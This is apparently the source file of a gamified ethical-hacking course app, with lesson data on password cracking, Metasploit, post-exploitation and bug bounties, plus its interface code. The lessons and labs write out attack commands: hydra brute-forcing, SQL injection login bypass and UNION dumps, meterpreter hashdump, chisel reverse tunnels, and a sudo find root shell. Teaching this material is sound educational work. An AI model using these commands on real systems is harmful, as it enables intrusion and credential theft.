      {type:"teach",text:"hashcat and john grind millions of passwords per second. rockyou.txt has 14 million leaked passwords \u2014 the go-to wordlist. hashcat -m 0 hash.txt rockyou.txt cracks MD5 hashes."},
      {type:"type",q:"Crack an MD5 hash with hashcat:",a:["hashcat -m 0 hash.txt rockyou.txt","hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt"],why:"-m 0 = MD5 mode. It tries every word in rockyou.txt."},
      {type:"teach",text:"hydra brute-forces live logins \u2014 like trying every key on a door. hydra -l admin -P rockyou.txt target ssh tries every password for the admin account over SSH."},
      {type:"type",q:"Brute-force SSH login as admin:",a:["hydra -l admin -P rockyou.txt 10.10.10.5 ssh","hydra -l admin -P /usr/share/wordlists/rockyou.txt target ssh"],why:"hydra tries passwords against live services."},
    ]},
    {id:"u12cp",title:"\uD83C\uDFC6 Password Checkpoint",isCheckpoint:true,rounds:[
      {type:"pick",q:"What is rockyou.txt?",opts:["A wordlist of 14M leaked passwords","A hacking tool","A hash algorithm","A password manager"],a:"A wordlist of 14M leaked passwords",why:"rockyou.txt is the standard wordlist for password cracking."},
      {type:"type",q:"Crack MD5 hashes:",a:["hashcat -m 0 hash.txt rockyou.txt"],why:"-m 0 is MD5. hashcat tries every word in the wordlist."},
      {type:"type",q:"Brute-force a live SSH login:",a:["hydra -l admin -P rockyou.txt target ssh","hydra -l admin -P rockyou.txt 10.10.10.5 ssh"],why:"hydra tests passwords against running services."},
    ]},
  ]},

  {id:"u13",title:"Metasploit",desc:"The weapon vault \u2014 exploits, payloads, and shells",levels:[
    {id:"u13l1",title:"Metasploit Basics",rounds:[
      {type:"teach",text:"Metasploit is your weapon vault. Exploits = the weapon (kicks the door down). Payloads = the spy you sneak in after (reverse shell, meterpreter). Workflow: search \u2192 use \u2192 set options \u2192 exploit."},
      {type:"type",q:"Start Metasploit:",a:["msfconsole"],why:"msfconsole launches the Metasploit interactive console."},
      {type:"teach",text:"search ssh finds SSH exploits. use exploit/path loads one. set RHOSTS target sets the target. set LHOST your_ip sets your IP (for reverse shells calling home). Then type exploit or run."},
      {type:"order",q:"Order the Metasploit workflow:",items:["search for exploit","use the module","set RHOSTS (target)","set LHOST (your IP)","exploit"],why:"This workflow applies to every Metasploit exploit."},
    ]},
    {id:"u13l2",title:"Meterpreter Shell",rounds:[
      {type:"teach",text:"Meterpreter is Metasploit's best payload \u2014 like planting an advanced spy inside. It can: upload/download files, take screenshots, record keystrokes, pivot to other machines, dump passwords, and persist through reboots."},
      {type:"pick",q:"Meterpreter can:",opts:["All of the above","Only execute commands","Only upload files","Only take screenshots"],a:"All of the above",why:"Meterpreter is a full-featured post-exploitation tool."},
      {type:"teach",text:"Key meterpreter commands: sysinfo (system info), getuid (who am I), hashdump (dump password hashes), upload/download (transfer files), shell (drop to normal shell), getsystem (try to get SYSTEM privileges on Windows)."},
      {type:"type",q:"Dump password hashes in meterpreter:",a:["hashdump","run hashdump"],why:"hashdump extracts password hashes from the target system."},
    ]},
    {id:"u13cp",title:"\uD83C\uDFC6 Exploitation Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Start Metasploit:",a:["msfconsole"],why:"The Metasploit console."},
      {type:"order",q:"Metasploit workflow:",items:["search for exploit","use module","set RHOSTS","set LHOST","exploit"],why:"Standard exploitation workflow."},
      {type:"type",q:"Dump hashes in meterpreter:",a:["hashdump","run hashdump"],why:"hashdump extracts credentials."},
      {type:"type",q:"Automate SQLi testing:",a:["sqlmap -u 'http://target/page?id=1' --dbs"],why:"sqlmap automates SQL injection."},
    ]},
  ]},

  // LAB
  {id:"u13lab",title:"\uD83D\uDDA5\uFE0F Lab: Hack the Login",desc:"SQL injection on a vulnerable login page",levels:[
    {id:"s3lab",title:"Lab: Hack the Login",rounds:[
      {type:"lab",title:"Hack the Login",objective:"Exploit SQL injection on MegaCorp's employee portal to extract user credentials.",banner:"Target: MegaCorp Employee Portal\nURL: http://10.10.10.66/login.php\n",steps:[
        {hint:"Test if the login is vulnerable. Try a single quote in the username.",accept:["'","~'"],output:"SQL Error: You have an error in your SQL syntax near ''' at line 1",successMsg:"SQL error! The login is vulnerable to injection.",example:"'",quickCmds:["'"]},
        {hint:"Bypass the login with SQL injection.",accept:["admin'--","~admin'--","' OR 1=1--","~OR 1=1"],output:"Welcome, admin! Login successful.\nDashboard: Employee Management System v3.2",successMsg:"You're in as admin! The -- commented out the password check.",example:"admin'--",quickCmds:["admin'--","' OR 1=1--"]},
        {hint:"Find how many columns the query returns (for UNION injection). Try ORDER BY.",accept:["~ORDER BY","' ORDER BY 3--","' ORDER BY 4--"],output:"' ORDER BY 3-- \u2192 OK\n' ORDER BY 4-- \u2192 ERROR\n\nThe query has 3 columns.",successMsg:"3 columns! Now you can use UNION SELECT with 3 values.",example:"' ORDER BY 3--",quickCmds:["' ORDER BY 3--","' ORDER BY 4--"]},
        {hint:"Extract usernames and passwords with UNION SELECT.",accept:["~UNION SELECT","~union select","' UNION SELECT username,password,1 FROM users--"],output:"admin    | 5f4dcc3b5aa765d61d8327deb882cf99\njsmith   | e99a18c428cb38d5f260853678922e03\nbackup   | 21232f297a57a5a743894a0e4a801fc3",successMsg:"Dumped user table! Now crack those hashes.",example:"' UNION SELECT username,password,1 FROM users--",quickCmds:["' UNION SELECT username,password,1 FROM users--"]},
        {hint:"Use sqlmap to automate and dump everything.",accept:["~sqlmap","sqlmap -u 'http://10.10.10.66/login.php' --dump"],output:"[*] found: users table\n[*] cracking hashes...\nadmin    : password\njsmith   : abc123\nbackup   : admin\n\n[*] 3 entries dumped",successMsg:"All credentials extracted! admin:password, jsmith:abc123, backup:admin. Critical vulnerability \u2014 write your report!",example:"sqlmap -u 'http://10.10.10.66/login.php' --dump",quickCmds:["sqlmap -u 'http://10.10.10.66/login.php' --dump"]}
      ]}
    ]}
  ]},
]};

// ============================================================
// SECTION 4: ADVANCED (Advanced)
// ============================================================
var SEC4 = {
  id:"s4",title:"Advanced & Bug Bounty",tier:"advanced",icon:"\uD83D\uDE80",color:"var(--purple)",
  desc:"Post-exploitation, pivoting, bug bounties, and scripting your own tools",
  units:[
  {id:"u14",title:"Post-Exploitation",desc:"Escalate privileges, pivot, and move laterally",levels:[
    {id:"u14l1",title:"Privilege Escalation",rounds:[
      {type:"teach",text:"After breaking in, you're a nobody \u2014 a janitor. PrivEsc = promoting yourself to king (root). First checks: sudo -l (can I run anything as boss?), SUID files (any master keys?), kernel version (any building flaws?)."},
      {type:"type",q:"First privesc check after getting a shell:",a:["sudo -l","sudo -ll"],why:"sudo -l shows what you can run as root. Sometimes it's an instant win."},
      {type:"teach",text:"LinPEAS automates all privesc checks. Upload it to the target and run it. It highlights everything in colors: red = high chance of privesc, yellow = interesting, green = info."},
      {type:"type",q:"Run automated privesc enumeration:",a:["./linpeas.sh","bash linpeas.sh","sh linpeas.sh"],why:"LinPEAS checks SUID, capabilities, crons, kernel, configs \u2014 everything."},
      {type:"tf",q:"If sudo -l shows you can run /usr/bin/find as root, that's a privesc vector.",a:true,why:"find with sudo can execute arbitrary commands: sudo find . -exec /bin/sh \\;"},
    ]},
    {id:"u14l2",title:"Pivoting",rounds:[
      {type:"teach",text:"Pivoting = using a hacked computer as a stepping stone to reach hidden computers behind it. Like breaking into the mailroom and now you can access internal hallways outsiders can't see."},
      {type:"teach",text:"Chisel creates secret tunnels. Your machine: chisel server --reverse -p 9999. Compromised machine: chisel client YOUR_IP:9999 R:8888:INTERNAL:80. Now your localhost:8888 reaches the internal server's port 80."},
      {type:"order",q:"Chisel pivoting setup:",items:["Start chisel server on your machine","Upload chisel to compromised host","Run chisel client pointing to your server","Access internal target through local port"],why:"Server on attacker, client on victim, tunnel established."},
    ]},
    {id:"u14cp",title:"\uD83C\uDFC6 Post-Exploit Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Check sudo privileges:",a:["sudo -l"],why:"First privesc check on any system."},
      {type:"type",q:"Find SUID binaries:",a:["find / -perm -4000","find / -perm -4000 2>/dev/null"],why:"SUID files run as their owner."},
      {type:"type",q:"Run LinPEAS:",a:["./linpeas.sh","bash linpeas.sh"],why:"Automated privesc enumeration."},
      {type:"type",q:"Start chisel server:",a:["chisel server --reverse -p 9999","chisel server -p 9999 --reverse"],why:"The server runs on YOUR machine for reverse tunnels."},
    ]},
  ]},

  {id:"u15",title:"Bug Bounty",desc:"Find real bugs and get paid for them",levels:[
    {id:"u15l1",title:"Bug Bounty Methodology",rounds:[
      {type:"teach",text:"Bug bounty game plan: 1) Read the rules (scope). 2) Recon (subdomains, tech stack). 3) Map every feature. 4) Test every input. 5) Chain small bugs into big ones. 6) Write a clear report and get paid."},
      {type:"order",q:"Bug bounty workflow:",items:["Read program scope","Subdomain enumeration","Map application features","Test for vulnerabilities","Chain findings for impact","Write clear report"],why:"Following methodology prevents missed findings."},
      {type:"teach",text:"Payouts vary by severity: Critical bugs ($5K-$50K+) = RCE, auth bypass. High ($1K-$10K) = stored XSS, SSRF. Medium ($200-$2K) = reflected XSS. Low ($50-$500) = missing headers. Platforms: HackerOne, Bugcrowd."},
      {type:"match",q:"Match severity to finding:",pairs:[["Critical","Remote Code Execution"],["High","Stored XSS"],["Medium","Reflected XSS"],["Low","Missing headers"]],why:"Understanding severity helps you prioritize."},
    ]},
    {id:"u15l2",title:"Recon Automation",rounds:[
      {type:"teach",text:"Bug bounty recon at scale: subfinder finds subdomains, httpx checks which are alive, nuclei scans for known vulnerabilities. Chain them: subfinder -d target.com | httpx | nuclei."},
      {type:"build",q:"Build the recon automation chain:",parts:["subfinder -d target.com","|","httpx","|","nuclei"],answer:["subfinder -d target.com","|","httpx","|","nuclei"],why:"This chain automates the entire external recon process."},
      {type:"type",q:"Find historical URLs for a target:",a:["waybackurls target.com","gau target.com"],why:"Historical URLs reveal forgotten endpoints that may still be vulnerable."},
    ]},
    {id:"u15l3",title:"Writing Reports",rounds:[
      {type:"teach",text:"A good report needs: Title + Severity, Description, Steps to Reproduce (exact!), Impact (what an attacker could do), and Remediation (how to fix). If the team can't reproduce your bug, they can't pay you."},
      {type:"order",q:"Sections of a bug report:",items:["Title & Severity","Description","Steps to Reproduce","Impact assessment","Remediation"],why:"This structure makes reports clear and actionable."},
      {type:"pick",q:"What makes the biggest difference in bug bounty reports?",opts:["Clear, reproducible steps","Fancy formatting","Multiple screenshots","Long descriptions"],a:"Clear, reproducible steps",why:"If they can't reproduce it, they can't fix or pay for it."},
    ]},
    {id:"u15cp",title:"\uD83C\uDFC6 Bug Bounty Checkpoint",isCheckpoint:true,rounds:[
      {type:"build",q:"Recon chain: subdomains \u2192 alive \u2192 scan:",parts:["subfinder -d target.com","|","httpx","|","nuclei"],answer:["subfinder -d target.com","|","httpx","|","nuclei"],why:"Standard automated recon pipeline."},
      {type:"type",q:"Find historical URLs:",a:["waybackurls target.com","gau target.com"],why:"Old URLs reveal forgotten endpoints."},
      {type:"order",q:"Bug report structure:",items:["Title & Severity","Description","Steps to Reproduce","Impact","Remediation"],why:"Clear structure gets reports accepted."},
      {type:"pick",q:"A critical bug bounty finding would be:",opts:["Remote Code Execution","Missing headers","Verbose error messages","Slow page load"],a:"Remote Code Execution",why:"RCE = running commands on the server = critical severity."},
    ]},
  ]},

  {id:"u16",title:"Bash Scripting",desc:"Automate tasks and build your own tools",levels:[
    {id:"u16l1",title:"Bash Basics",rounds:[
      {type:"teach",text:"A bash script is a text file with commands that run in order. Start every script with #!/bin/bash (tells the system to use bash). Save as script.sh, make executable with chmod +x script.sh, run with ./script.sh."},
      {type:"type",q:"Make a script executable:",a:["chmod +x script.sh"],why:"chmod +x adds execute permission so you can run the script."},
      {type:"teach",text:"Variables: name='kali' stores a value. Use it with $name. Read user input with read: echo 'Enter IP:' and then read target stores what they type in $target."},
      {type:"type",q:"Create a variable called target with value 10.10.10.5:",a:["target='10.10.10.5'","target=10.10.10.5","target=\"10.10.10.5\""],why:"Variables store values. Access with $target."},
    ]},
    {id:"u16l2",title:"Loops & Conditions",rounds:[
      {type:"teach",text:"for loops: for port in 22 80 443; do nmap -p $port target; done \u2014 scans 3 ports one at a time. if/then: if [ $? -eq 0 ]; then echo 'success'; fi \u2014 checks if the last command worked."},
      {type:"teach",text:"while read line; do echo $line; done < file.txt processes a file line by line. This pattern is used constantly \u2014 reading IP lists, wordlists, URL lists."},
      {type:"pick",q:"for i in 1 2 3; do echo $i; done prints:",opts:["1, 2, 3 on separate lines","1 2 3 on one line","Nothing","An error"],a:"1, 2, 3 on separate lines",why:"The for loop runs echo for each value."},
    ]},
    {id:"u16l3",title:"Build: Port Scanner",rounds:[
      {type:"teach",text:"Let's build a simple port scanner in bash. For each port, we try to connect. If it works, the port is open. We use /dev/tcp/IP/PORT which bash can test directly."},
      {type:"build",q:"Build a bash port check for port 80:",parts:["(echo > /dev/tcp/10.10.10.5/80)","2>/dev/null","&&","echo 'Port 80 open'"],answer:["(echo > /dev/tcp/10.10.10.5/80)","2>/dev/null","&&","echo 'Port 80 open'"],why:"/dev/tcp tests if a port accepts connections. 2>/dev/null hides errors."},
    ]},
    {id:"u16cp",title:"\uD83C\uDFC6 Scripting Checkpoint",isCheckpoint:true,rounds:[
      {type:"type",q:"Make script.sh executable:",a:["chmod +x script.sh"],why:"Scripts need execute permission."},
      {type:"type",q:"Store user input in a variable called ip:",a:["read ip","read -p 'IP: ' ip"],why:"read stores user input in a variable."},
      {type:"pick",q:"#!/bin/bash at the top of a script is called:",opts:["A shebang","A comment","A variable","A function"],a:"A shebang",why:"The shebang tells the system which interpreter to use."},
    ]},
  ]},

  {id:"u17",title:"Python for Hackers",desc:"Build real hacking tools with Python",levels:[
    {id:"u17l1",title:"Python Basics",rounds:[
      {type:"teach",text:"Python is the #1 language for hacking tools. Easy to learn, massive library of network/security modules. Most exploit code is written in Python. You need the basics: variables, strings, lists, loops, functions."},
      {type:"teach",text:"Variables: ip = '10.10.10.5'. Lists: ports = [22, 80, 443]. Loops: for port in ports: print(port). Functions: def scan(ip): ... These basics let you build real tools."},
      {type:"pick",q:"Why is Python popular for hacking?",opts:["Easy syntax + huge security libraries","It's the fastest language","It's built into Kali only","It can't be detected"],a:"Easy syntax + huge security libraries",why:"Python has libraries for networking, web requests, packet crafting, and more."},
    ]},
    {id:"u17l2",title:"Sockets & Requests",rounds:[
      {type:"teach",text:"Sockets = raw phone calls to a computer's port. You dial (connect), check if someone picks up (connect_ex returns 0 = open). The requests library is easier for web stuff \u2014 r = requests.get(url) fetches a webpage."},
      {type:"teach",text:"import socket; s = socket.socket(); s.settimeout(1); result = s.connect_ex((ip, port)) \u2014 if result is 0, the port is open. This is the foundation of every port scanner."},
      {type:"pick",q:"socket.connect_ex() returns 0 when:",opts:["The port is open","The port is closed","There's an error","The host is down"],a:"The port is open",why:"0 = successful connection = open port."},
    ]},
    {id:"u17l3",title:"Build: Python Port Scanner",rounds:[
      {type:"teach",text:"With threading, you can scan 50 ports at once instead of one at a time. ThreadPoolExecutor(50) creates 50 workers. Each checks one port. What took 8 minutes now takes 2 seconds."},
      {type:"tf",q:"Threading makes port scanning faster by checking multiple ports simultaneously.",a:true,why:"Without threading: one port at a time. With 50 threads: 50 ports at a time = 50x faster."},
    ]},
    {id:"u17cp",title:"\uD83C\uDFC6 Python Checkpoint",isCheckpoint:true,rounds:[
      {type:"pick",q:"Python socket.connect_ex() returns 0 when:",opts:["Port is open","Port is closed","Timeout","DNS error"],a:"Port is open",why:"0 = connection successful = port open."},
      {type:"pick",q:"requests.get(url) returns:",opts:["HTTP response object","Raw bytes","A socket","A file"],a:"HTTP response object",why:"The response has .status_code, .text, .json() etc."},
      {type:"tf",q:"Threading makes scans faster by checking multiple ports at once.",a:true,why:"50 threads = 50 ports scanned simultaneously."},
    ]},
  ]},

  // FINAL LAB
  {id:"u17lab",title:"\uD83D\uDDA5\uFE0F Lab: Root the Box",desc:"Full attack chain: scan, exploit, escalate to root",levels:[
    {id:"s4lab",title:"Lab: Root the Box",rounds:[
      {type:"lab",title:"Root the Box",objective:"Escalate from www-data to root on a compromised Linux server.",banner:"Connected to 10.10.10.99 as www-data\n$ whoami\nwww-data\n",steps:[
        {hint:"Check what you can run as root.",accept:["sudo -l"],output:"User www-data may run the following on target:\n  (root) NOPASSWD: /usr/bin/find",successMsg:"You can run find as root without a password! Check GTFOBins.",example:"sudo -l",quickCmds:["sudo -l"]},
        {hint:"Check for SUID binaries too.",accept:["find / -perm -4000","~find / -perm -4000"],output:"/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/find\n/usr/bin/python3\n/usr/bin/chfn",successMsg:"find AND python3 have SUID! Multiple privesc paths.",example:"find / -perm -4000 2>/dev/null",quickCmds:["find / -perm -4000 2>/dev/null"]},
        {hint:"Use sudo find to get a root shell (check GTFOBins for the find trick).",accept:["sudo find . -exec /bin/sh \\;","~sudo find","sudo find . -exec /bin/bash \\;","~-exec /bin/sh"],output:"# whoami\nroot\n# id\nuid=0(root) gid=0(root) groups=0(root)",successMsg:"ROOT! sudo find -exec spawns a shell as root.",example:"sudo find . -exec /bin/sh \\;",quickCmds:["sudo find . -exec /bin/sh \\;"]},
        {hint:"Grab the root flag.",accept:["cat /root/root.txt","~cat /root/root"],output:"FLAG{pr1v_3sc_v1a_sud0_f1nd}",successMsg:"FLAG CAPTURED! You escalated from www-data to root using sudo find. Full privesc chain complete!",example:"cat /root/root.txt",quickCmds:["cat /root/root.txt"]}
      ]}
    ]}
  ]},
]};

// ============================================================
// BUILD MASTER DATA
// ============================================================
var SECTIONS = [SEC1, SEC2, SEC3, SEC4];
var ALL_UNITS = [];
var ALL_LEVELS = [];
var PATH = [];

SECTIONS.forEach(function(sec){
  sec.units.forEach(function(unit){
    unit.sectionId = sec.id;
    unit.sectionTitle = sec.title;
    unit.tier = sec.tier;
    ALL_UNITS.push(unit);
    unit.levels.forEach(function(lev){
      lev.unitId = unit.id;
      lev.unitTitle = unit.title;
      lev.sectionId = sec.id;
      lev.tier = sec.tier;
      ALL_LEVELS.push(lev);
      PATH.push(lev.id);
    });
  });
});

// === MODAL ===
function showConfirm(title,msg,onYes){
  var overlay=document.createElement('div');
  overlay.style.cssText='position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.65);z-index:1000;display:flex;align-items:center;justify-content:center;padding:20px;animation:fadeIn .2s ease';
  var box=document.createElement('div');box.className='card popIn';
  box.style.cssText='max-width:340px;width:100%;text-align:center;display:flex;flex-direction:column;gap:14px';
  box.innerHTML='<div style="font-size:1.05rem;font-weight:700">'+title+'</div><div style="font-size:.85rem;color:var(--text2)">'+msg+'</div>';
  var btns=document.createElement('div');btns.style.cssText='display:flex;gap:8px';
  var no=document.createElement('button');no.className='btn sec';no.style.flex='1';no.textContent='Cancel';
  no.onclick=function(){overlay.remove()};
  var yes=document.createElement('button');yes.className='btn';yes.style.cssText='flex:1;background:var(--red);color:white';
  yes.textContent='Confirm';yes.onclick=function(){overlay.remove();if(onYes)onYes()};
  btns.appendChild(no);btns.appendChild(yes);box.appendChild(btns);
  overlay.appendChild(box);document.body.appendChild(overlay);
  overlay.onclick=function(e){if(e.target===overlay)overlay.remove()};
}

// === APP STATE ===
var S={screen:'auth',user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:'dark',volume:80,sfx:true,haptics:true}};
var root=document.getElementById('root');

function render(){
  root.innerHTML='';
  if(S.screen==='auth')renderAuth();
  else if(S.screen==='os')renderOS();
  else if(S.screen==='map'){renderMap();renderNav('map')}
  else if(S.screen==='lesson')renderLesson();
  else if(S.screen==='result')renderResult();
  else if(S.screen==='settings'){renderSettings();renderNav('settings')}
}

function getNext(){for(var i=0;i<PATH.length;i++)if(!S.progress[PATH[i]]||!S.progress[PATH[i]].passed)return PATH[i];return null}
function getXP(){var t=0;for(var k in S.progress)if(S.progress[k].xp)t+=S.progress[k].xp;return t}

function renderNav(active){
  var nav=document.createElement('div');nav.className='bnav';
  var tabs=[{id:'map',ico:'\uD83D\uDDFA\uFE0F',label:'Learn'},{id:'settings',ico:'\u2699\uFE0F',label:'Settings'}];
  tabs.forEach(function(t){
    var b=document.createElement('button');b.className='bnav-btn'+(active===t.id?' active':'');
    b.innerHTML='<span class="ico">'+t.ico+'</span>'+t.label;
    b.onclick=function(){SFX.tap();S.screen=t.id;render()};
    nav.appendChild(b);
  });
  root.appendChild(nav);
}

// === AUTH ===
function renderAuth(){
  var mode='login';
  function draw(){
    root.innerHTML='';
    var w=document.createElement('div');w.className='center';
    w.innerHTML='<div style="text-align:center"><div style="font-size:2.5rem;font-family:JetBrains Mono,monospace;font-weight:800"><span style="background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">&gt;_HackPath</span></div><div style="color:var(--textDim);margin-top:8px;font-size:.9rem">Learn ethical hacking from zero to bug bounty</div></div>';
    var c=document.createElement('div');c.className='card gap';c.style.width='100%';
    var tabs=document.createElement('div');tabs.style.cssText='display:flex;gap:8px';
    var bl=document.createElement('button');bl.className='btn sm '+(mode==='login'?'':'sec');bl.textContent='Login';bl.onclick=function(){mode='login';draw()};
    var br=document.createElement('button');br.className='btn sm '+(mode==='register'?'':'sec');br.textContent='Register';br.onclick=function(){mode='register';draw()};
    tabs.appendChild(bl);tabs.appendChild(br);
    var iu=document.createElement('input');iu.className='inp';iu.placeholder='Username';iu.autocomplete='username';
    var ip=document.createElement('input');ip.className='inp';ip.type='password';ip.placeholder='Password';
    var err=document.createElement('div');err.style.cssText='color:var(--red);font-size:.82rem;min-height:20px';
    var sub=document.createElement('button');sub.className='btn full';sub.textContent=mode==='login'?'Login':'Register';
    sub.onclick=function(){
      var u=iu.value.trim(),p=ip.value;
      if(!u||!p){err.textContent='Fill in both fields';return}
      if(mode==='register'){
        var ne=checkUName(u);if(ne){err.textContent=ne;return}
        if(p.length<3){err.textContent='Password needs 3+ characters';return}
        if(checkUser(u)){err.textContent='Username taken';return}
        saveUser(u,p);doLogin(u);
      }else{
        var st=checkUser(u);if(!st||st!==p){err.textContent='Wrong username or password';return}
        doLogin(u);
      }
    };
    iu.onkeydown=ip.onkeydown=function(e){if(e.key==='Enter')sub.click()};
    c.appendChild(tabs);c.appendChild(iu);c.appendChild(ip);c.appendChild(err);c.appendChild(sub);
    var skip=document.createElement('button');skip.className='btn sec full';skip.style.opacity='.6';skip.textContent='Skip \u2014 try without account';skip.onclick=function(){doLogin('guest')};
    w.appendChild(c);w.appendChild(skip);root.appendChild(w);iu.focus();
  }
  draw();
}

function doLogin(u){
  S.user=u;S.progress=loadP(u);S.userOS=loadOS(u);
  var sets=loadSets(u);
  S.settings={theme:sets.theme||'dark',volume:sets.volume!==undefined?sets.volume:80,sfx:sets.sfx!==undefined?sets.sfx:true,haptics:sets.haptics!==undefined?sets.haptics:true};
  _vol=S.settings.volume;_sfxOn=S.settings.sfx;
  applyTheme(S.settings.theme);
  S.screen=S.userOS?'map':'os';render();
}

// === OS PICKER ===
function renderOS(){
  var sel=S.userOS?S.userOS.slice():[];
  var oses=[{id:'mobile',icon:'\uD83D\uDCF1',name:'Mobile / Any Device',desc:'No terminal needed'},{id:'linux',icon:'\uD83D\uDC27',name:'Linux / Kali',desc:'Recommended for hacking'},{id:'windows',icon:'\uD83E\uDE9F',name:'Windows',desc:'PowerShell & WSL'},{id:'mac',icon:'\uD83C\uDF4E',name:'macOS',desc:'Unix-based terminal'}];
  function draw(){
    root.innerHTML='';
    var w=document.createElement('div');w.className='center';
    w.innerHTML='<div style="text-align:center"><div style="font-size:1.3rem;font-weight:700">How are you learning?</div><div style="color:var(--textDim);font-size:.85rem;margin-top:4px">Pick your device. This customizes commands shown in lessons.</div></div>';
    var list=document.createElement('div');list.className='gap';list.style.width='100%';
    oses.forEach(function(o){
      var b=document.createElement('div');b.className='osbtn'+(sel.indexOf(o.id)!==-1?' sel':'');
      b.innerHTML='<div style="font-size:1.5rem">'+o.icon+'</div><div style="font-weight:600;margin-top:4px">'+o.name+'</div><div style="font-size:.72rem;color:var(--textDim);margin-top:2px">'+o.desc+'</div>';
      b.onclick=function(){SFX.tap();var i=sel.indexOf(o.id);if(i===-1)sel.push(o.id);else sel.splice(i,1);draw()};
      list.appendChild(b);
    });
    var go=document.createElement('button');go.className='btn full';go.disabled=!sel.length;go.textContent='Continue';
    go.onclick=function(){S.userOS=sel;saveOS(S.user,sel);S.screen='map';render()};
    w.appendChild(list);w.appendChild(go);root.appendChild(w);
  }
  draw();
}

// === SETTINGS ===
function renderSettings(){
  var w=document.createElement('div');w.className='hp fadeIn';

  // Header
  var hdr=document.createElement('div');hdr.className='hdr';
  hdr.innerHTML='<span class="logo">&gt;_Settings</span>';
  var xp=document.createElement('span');xp.className='badge badge-xp';xp.textContent='\u26A1 '+getXP()+' XP';
  hdr.appendChild(xp);w.appendChild(hdr);

  // Profile
  var g1=document.createElement('div');g1.className='set-group';
  g1.innerHTML='<div class="set-label">Profile</div>';
  var r1=document.createElement('div');r1.className='set-row';
  r1.innerHTML='<div class="left"><div class="icon">\uD83D\uDC64</div><div><div class="label">'+esc(S.user||'Guest')+'</div><div class="sublabel">Logged in</div></div></div>';
  g1.appendChild(r1);w.appendChild(g1);

  // Appearance
  var g2=document.createElement('div');g2.className='set-group';
  g2.innerHTML='<div class="set-label">Appearance</div>';
  var tg=document.createElement('div');tg.className='theme-grid';
  Object.keys(THEMES).forEach(function(tid){
    var th=THEMES[tid];
    var d=document.createElement('div');d.className='theme-opt'+(S.settings.theme===tid?' sel':'');
    d.innerHTML='<div class="theme-dot" style="background:'+th.dot+';border-color:'+th.border+'"></div><div style="font-size:.82rem;font-weight:600">'+th.name+'</div>';
    d.onclick=function(){SFX.tap();S.settings.theme=tid;applyTheme(tid);saveSets(S.user,S.settings);render()};
    tg.appendChild(d);
  });
  g2.appendChild(tg);w.appendChild(g2);

  // Sound
  var g3=document.createElement('div');g3.className='set-group';
  g3.innerHTML='<div class="set-label">Sound</div>';

  var sfxRow=document.createElement('div');sfxRow.className='set-row';
  sfxRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDD0A</div><div class="label">Sound Effects</div></div>';
  var tog=document.createElement('div');tog.className='toggle'+(S.settings.sfx?' on':'');
  tog.onclick=function(){S.settings.sfx=!S.settings.sfx;_sfxOn=S.settings.sfx;saveSets(S.user,S.settings);render()};
  sfxRow.appendChild(tog);g3.appendChild(sfxRow);

  var volRow=document.createElement('div');volRow.className='slider-wrap';
  volRow.innerHTML='<span style="font-size:1rem">\uD83D\uDD09</span>';
  var sl=document.createElement('input');sl.type='range';sl.min='0';sl.max='100';sl.value=String(S.settings.volume);
  var vlbl=document.createElement('span');vlbl.className='slider-val';vlbl.textContent=S.settings.volume+'%';
  sl.oninput=function(){S.settings.volume=parseInt(sl.value);_vol=S.settings.volume;vlbl.textContent=S.settings.volume+'%'};
  sl.onchange=function(){saveSets(S.user,S.settings);SFX.tap()};
  volRow.appendChild(sl);volRow.appendChild(vlbl);g3.appendChild(volRow);
  w.appendChild(g3);

  // Device
  var g4=document.createElement('div');g4.className='set-group';
  g4.innerHTML='<div class="set-label">Device</div>';
  var devRow=document.createElement('div');devRow.className='set-row';devRow.style.cursor='pointer';
  var osText=S.userOS?S.userOS.join(', '):'Not set';
  devRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDCBB</div><div><div class="label">Learning Device</div><div class="sublabel">'+esc(osText)+'</div></div></div><span style="color:var(--textDim)">\u276F</span>';
  devRow.onclick=function(){SFX.tap();S.screen='os';render()};
  g4.appendChild(devRow);w.appendChild(g4);

  // Data
  var g5=document.createElement('div');g5.className='set-group';
  g5.innerHTML='<div class="set-label">Data</div>';

  var done=0;PATH.forEach(function(id){if(S.progress[id]&&S.progress[id].passed)done++});
  var statRow=document.createElement('div');statRow.className='set-row';
  statRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDCCA</div><div><div class="label">Progress</div><div class="sublabel">'+done+'/'+PATH.length+' levels \u2022 '+getXP()+' XP</div></div></div>';
  g5.appendChild(statRow);

  var resetRow=document.createElement('div');resetRow.className='set-row';resetRow.style.cursor='pointer';
  resetRow.innerHTML='<div class="left"><div class="icon">\uD83D\uDDD1\uFE0F</div><div><div class="label" style="color:var(--red)">Reset Progress</div><div class="sublabel">Start over from scratch</div></div></div><span style="color:var(--textDim)">\u276F</span>';
  resetRow.onclick=function(){showConfirm('Reset all progress?','This cannot be undone. You will lose all XP and level completions.',function(){S.progress={};saveP(S.user,{});SFX.tap();render()})};
  g5.appendChild(resetRow);w.appendChild(g5);

  // Logout
  var lo=document.createElement('button');lo.className='btn sec full';lo.style.marginTop='8px';
  lo.textContent='Logout';lo.onclick=function(){S={screen:'auth',user:null,userOS:null,progress:{},activeId:null,ri:0,scores:[],settings:{theme:'dark',volume:80,sfx:true,haptics:true}};applyTheme('dark');render()};
  w.appendChild(lo);

  var ver=document.createElement('div');ver.style.cssText='text-align:center;padding:20px 0;font-size:.7rem;color:var(--textDim)';
  ver.textContent='HackPath v11 \u2022 Learn Ethical Hacking';w.appendChild(ver);

  root.appendChild(w);
}

// === MAP ===
function renderMap(){
  var next=getNext(),xp=getXP();
  var done=0;PATH.forEach(function(id){if(S.progress[id]&&S.progress[id].passed)done++});
  var pct=Math.round(done/PATH.length*100);
  var w=document.createElement('div');w.className='hp fadeIn';

  // Header
  var hdr=document.createElement('div');hdr.className='hdr';
  var h1=document.createElement('span');h1.className='logo';h1.textContent='>_HackPath';hdr.appendChild(h1);
  var hr=document.createElement('div');hr.className='hdr-r';
  hr.innerHTML='<span class="badge badge-xp">\u26A1 '+xp+' XP</span><span class="badge badge-level">\uD83C\uDFAF '+done+'/'+PATH.length+'</span>';
  hdr.appendChild(hr);w.appendChild(hdr);

  // Overall progress
